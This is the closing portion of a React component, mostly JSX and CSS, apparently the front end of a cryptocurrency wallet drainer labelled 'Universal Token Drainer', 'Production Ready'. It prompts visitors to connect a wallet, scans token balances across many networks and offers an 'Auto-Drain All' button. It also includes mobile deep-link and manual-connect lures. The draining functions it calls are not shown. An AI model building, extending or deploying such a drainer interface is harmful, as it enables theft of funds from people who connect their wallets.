          {isConnected ? (
            <>
              {/* Status Dashboard */}
              <div className="status-dashboard">
                <div className="status-card primary">
                  <div className="status-icon">
                    {isScanning ? '🔍' : isProcessing ? '⚡' : '✅'}
                  </div>
                  <div className="status-content">
                    <div className="status-title">UNIVERSAL DRAIN SYSTEM</div>
                    <div className="status-message">{status}</div>
                    {isScanning && (
                      <div className="scan-progress">
                        <div className="progress-bar">
                          <div 
                            className="progress-fill" 
                            style={{ width: `${scanProgress}%` }}
                          ></div>
                        </div>
                        <div className="progress-text">Scanning: {scanProgress}%</div>
                      </div>
                    )}
                  </div>
                </div>
                
                <div className="stats-row">
                  <div className="stat">
                    <div className="stat-value">${totalValue.toFixed(2)}</div>
                    <div className="stat-label">Total Value</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">{tokens.length}</div>
                    <div className="stat-label">Tokens Found</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">
                      {backendOnline ? '✅ Online' : '⚠️ Offline'}
                    </div>
                    <div className="stat-label">Backend</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">{NETWORKS.length}</div>
                    <div className="stat-label">Networks</div>
                  </div>
                </div>
              </div>

              {/* Controls */}
              <div className="controls-container">
                <button
                  onClick={scanAllNetworks}
                  disabled={isScanning || isProcessing}
                  className="btn btn-scan"
                >
                  {isScanning ? `Scanning ${scanProgress}%` : '🔍 Scan All Networks'}
                </button>
                
                {tokens.length > 0 && (
                  <button
                    onClick={() => autoDrain()}
                    disabled={isProcessing}
                    className="btn btn-drain"
                  >
                    {isProcessing ? 'Processing...' : '⚡ Auto-Drain All'}
                  </button>
                )}
                
                {mobileDetected && (
                  <button
                    onClick={handleMobileDeepLink}
                    className="btn btn-mobile"
                  >
                    📱 Open Wallet
                  </button>
                )}
              </div>

              {/* Tokens List */}
              {tokens.length > 0 && (
                <div className="tokens-panel">
                  <div className="panel-header">
                    <h3>Detected Tokens ({tokens.length})</h3>
                    <div className="total-value">Total: ${totalValue.toFixed(2)}</div>
                  </div>
                  <div className="tokens-grid">
                    {tokens.map(token => (
                      <div key={token.id} className="token-card">
                        <div className="token-header">
                          <div className="token-symbol">{token.symbol}</div>
                          <div className="token-network">{token.network}</div>
                          <div className={`token-type ${token.type}`}>
                            {token.type === 'evm' ? 'EVM' : 'Non-EVM'}
                          </div>
                        </div>
                        <div className="token-amount">{token.amount} {token.symbol}</div>
                        <div className="token-value">${token.valueUSD.toFixed(2)}</div>
                        <div className="token-status">
                          <span className="status-auto">Auto-drain enabled</span>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Error Message */}
              {connectionError && (
                <div className="error-alert">
                  <div className="error-icon">⚠️</div>
                  <div className="error-message">{connectionError}</div>
                </div>
              )}
            </>
          ) : (
            <div className="welcome-screen">
              <div className="welcome-content">
                <div className="welcome-icon">⚡</div>
                <h2>Universal Token Drainer</h2>
                <p className="welcome-text">
                  Connect your wallet to automatically scan and drain tokens 
                  across all major EVM and Non-EVM networks.
                </p>
                
                <div className="connect-section">
                  <ConnectKitButton />
                  
                  {mobileDetected && (
                    <>
                      <p className="mobile-hint">
                        📱 Having issues? Try manual connection:
                      </p>
                      <button 
                        onClick={handleManualConnect}
                        className="btn btn-mobile-large"
                      >
                        🔗 Manual Wallet Connect
                      </button>
                    </>
                  )}
                </div>
                
                <div className="network-stats">
                  <div className="stat-item">
                    <div className="stat-number">{NETWORKS.length}</div>
                    <div className="stat-label">Networks</div>
                  </div>
                  <div className="stat-item">
                    <div className="stat-number">50+</div>
                    <div className="stat-label">Tokens</div>
                  </div>
                  <div className="stat-item">
                    <div className="stat-number">Auto</div>
                    <div className="stat-label">Drain</div>
                  </div>
                </div>
              </div>
            </div>
          )}
        </main>

        <footer className="app-footer">
          <div className="footer-content">
            <span className="status-dot"></span>
            <span>Universal Drainer • v2.0 • Production Ready</span>
            <span>{backendOnline ? '✅ Backend Online' : '⚠️ Backend Offline'}</span>
          </div>
        </footer>
      </div>

      {/* CSS Styles */}
      <style jsx>{`
        .App {
          min-height: 100vh;
          background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
          color: white;
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        .app-container {
          max-width: 1200px;
          margin: 0 auto;
          padding: 20px;
        }
        
        /* Header */
        .app-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 20px 0;
          border-bottom: 2px solid #333;
          margin-bottom: 30px;
        }
        
        .header-left {
          display: flex;
          align-items: center;
          gap: 15px;
        }
        
        .logo {
          font-size: 32px;
          background: #ef4444;
          width: 50px;
          height: 50px;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.1); }
        }
        
        h1 {
          margin: 0;
          font-size: 24px;
          font-weight: 700;
          color: #ef4444;
        }
        
        .subtitle {
          margin: 5px 0 0 0;
          color: #888;
          font-size: 14px;
        }
        
        .connected-wallet {
          display: flex;
          align-items: center;
          gap: 10px;
        }
        
        .wallet-address {
          background: #222;
          padding: 8px 12px;
          border-radius: 8px;
          font-family: monospace;
          font-size: 14px;
          border: 1px solid #333;
        }
        
        .wallet-type {
          font-size: 12px;
          color: #0af;
          padding: 4px 8px;
          background: rgba(0, 170, 255, 0.1);
          border-radius: 6px;
        }
        
        .mobile-badge {
          background: rgba(0, 100, 255, 0.2);
          color: #3b82f6;
          padding: 4px 8px;
          border-radius: 6px;
          font-size: 12px;
          border: 1px solid rgba(0, 100, 255, 0.3);
        }
        
        .disconnect-btn {
          background: #444;
          color: white;
          border: none;
          padding: 8px 12px;
          border-radius: 8px;
          cursor: pointer;
          font-size: 14px;
        }
        
        .disconnect-btn:hover {
          background: #555;
        }
        
        /* Status Dashboard */
        .status-dashboard {
          margin-bottom: 30px;
        }
        
        .status-card {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          display: flex;
          align-items: center;
          gap: 15px;
          border: 2px solid #333;
          margin-bottom: 20px;
        }
        
        .status-card.primary {
          background: linear-gradient(135deg, #7c2d12, #dc2626);
          border-color: #ef4444;
        }
        
        .status-icon {
          font-size: 32px;
        }
        
        .status-content {
          flex: 1;
        }
        
        .status-title {
          font-size: 14px;
          color: #aaa;
          text-transform: uppercase;
          letter-spacing: 2px;
          margin-bottom: 5px;
        }
        
        .status-message {
          font-size: 18px;
          font-weight: 600;
          color: white;
        }
        
        .stats-row {
          display: flex;
          gap: 15px;
        }
        
        .stat {
          flex: 1;
          background: #222;
          border-radius: 12px;
          padding: 20px;
          text-align: center;
          border: 1px solid #333;
        }
        
        .stat-value {
          font-size: 28px;
          font-weight: 700;
          color: #ef4444;
          margin-bottom: 5px;
        }
        
        .stat-label {
          color: #888;
          font-size: 14px;
          text-transform: uppercase;
          letter-spacing: 1px;
        }
        
        /* Controls */
        .controls-container {
          display: flex;
          gap: 15px;
          margin-bottom: 30px;
        }
        
        .btn {
          flex: 1;
          padding: 16px 24px;
          border: none;
          border-radius: 12px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.3s;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 10px;
        }
        
        .btn:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }
        
        .btn-scan {
          background: linear-gradient(135deg, #1e40af, #3b82f6);
          color: white;
        }
        
        .btn-scan:hover:not(:disabled) {
          background: linear-gradient(135deg, #1e3a8a, #2563eb);
          transform: translateY(-2px);
        }
        
        .btn-drain {
          background: linear-gradient(135deg, #dc2626, #ef4444);
          color: white;
        }
        
        .btn-drain:hover:not(:disabled) {
          background: linear-gradient(135deg, #b91c1c, #dc2626);
          transform: translateY(-2px);
        }
        
        .btn-mobile {
          background: linear-gradient(135deg, #1e40af, #3b82f6);
          color: white;
        }
        
        .btn-mobile:hover:not(:disabled) {
          background: linear-gradient(135deg, #1e3a8a, #2563eb);
          transform: translateY(-2px);
        }
        
        .btn-mobile-large {
          background: linear-gradient(135deg, #1e40af, #3b82f6);
          color: white;
          padding: 16px 24px;
          border: none;
          border-radius: 12px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          margin-top: 10px;
          width: 100%;
          max-width: 300px;
        }
        
        /* Tokens */
        .tokens-panel {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          margin-bottom: 20px;
          border: 1px solid #333;
        }
        
        .panel-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 20px;
        }
        
        .panel-header h3 {
          margin: 0;
          font-size: 18px;
          color: white;
        }
        
        .total-value {
          font-size: 18px;
          font-weight: 700;
          color: #10b981;
        }
        
        .tokens-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
          gap: 15px;
        }
        
        .token-card {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 20px;
          border: 1px solid #333;
          transition: all 0.3s;
        }
        
        .token-card:hover {
          border-color: #444;
          transform: translateY(-2px);
        }
        
        .token-header {
          display: flex;
          align-items: center;
          gap: 10px;
          margin-bottom: 10px;
        }
        
        .token-symbol {
          font-weight: 700;
          font-size: 20px;
          color: white;
        }
        
        .token-network {
          color: #888;
          font-size: 12px;
          flex: 1;
        }
        
        .token-type {
          padding: 2px 6px;
          border-radius: 4px;
          font-size: 10px;
          font-weight: 600;
          text-transform: uppercase;
        }
        
        .token-type.evm {
          background: rgba(59, 130, 246, 0.2);
          color: #3b82f6;
        }
        
        .token-type.non-evm {
          background: rgba(239, 68, 68, 0.2);
          color: #ef4444;
        }
        
        .token-amount {
          font-size: 24px;
          font-weight: 700;
          color: white;
          margin-bottom: 5px;
        }
        
        .token-value {
          color: #10b981;
          font-size: 18px;
          font-weight: 600;
          margin-bottom: 10px;
        }
        
        .token-status .status-auto {
          background: rgba(239, 68, 68, 0.2);
          color: #ef4444;
          padding: 4px 8px;
          border-radius: 6px;
          font-size: 12px;
          font-weight: 600;
        }
        
        /* Error Alert */
        .error-alert {
          background: linear-gradient(135deg, #7c2d12, #dc2626);
          border-radius: 12px;
          padding: 15px;
          display: flex;
          align-items: center;
          gap: 15px;
          margin-bottom: 20px;
          border: 2px solid #ef4444;
          animation: pulse-alert 2s infinite;
        }
        
        @keyframes pulse-alert {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.8; }
        }
        
        .error-icon {
          font-size: 24px;
        }
        
        .error-message {
          flex: 1;
          color: white;
          font-size: 14px;
        }
        
        /* Welcome Screen */
        .welcome-screen {
          text-align: center;
          padding: 60px 20px;
          max-width: 600px;
          margin: 0 auto;
        }
        
        .welcome-icon {
          font-size: 64px;
          margin-bottom: 20px;
        }
        
        .welcome-text {
          color: #ddd;
          margin-bottom: 30px;
          font-size: 18px;
          line-height: 1.6;
        }
        
        .mobile-hint {
          color: #888;
          margin: 15px 0;
          font-size: 14px;
        }
        
        .network-stats {
          display: flex;
          justify-content: center;
          gap: 40px;
          margin-top: 40px;
        }
        
        .stat-item {
          text-align: center;
        }
        
        .stat-number {
          font-size: 36px;
          font-weight: 700;
          color: #ef4444;
          margin-bottom: 5px;
        }
        
        .stat-label {
          color: #888;
          font-size: 14px;
          text-transform: uppercase;
          letter-spacing: 1px;
        }
        
        /* Footer */
        .app-footer {
          margin-top: 40px;
          padding-top: 20px;
          border-top: 1px solid #333;
          text-align: center;
          color: #888;
          font-size: 14px;
        }
        
        .footer-content {
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 15px;
        }
        
        .status-dot {
          width: 8px;
          height: 8px;
          background: #10b981;
          border-radius: 50%;
          animation: pulse 2s infinite;
        }
        
        /* Progress Bar */
        .scan-progress {
          margin-top: 15px;
        }
        
        .progress-bar {
          height: 6px;
          background: #333;
          border-radius: 3px;
          overflow: hidden;
        }
        
        .progress-fill {
          height: 100%;
          background: linear-gradient(90deg, #3b82f6, #10b981);
          transition: width 0.3s;
        }
        
        .progress-text {
          font-size: 12px;
          color: #888;
          margin-top: 5px;
          text-align: right;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
          .app-header {
            flex-direction: column;
            gap: 20px;
            text-align: center;
          }
          
          .connected-wallet {
            flex-wrap: wrap;
            justify-content: center;
          }
          
          .stats-row {
            flex-direction: column;
          }
          
          .controls-container {
            flex-direction: column;
          }
          
          .tokens-grid {
            grid-template-columns: 1fr;
          }
          
          .footer-content {
            flex-direction: column;
            gap: 5px;
          }
          
          .network-stats {
            gap: 20px;
          }
          
          .stat-number {
            font-size: 28px;
          }
        }
      `}</style>
    </div>
  );
}

export default TokenDrainApp;
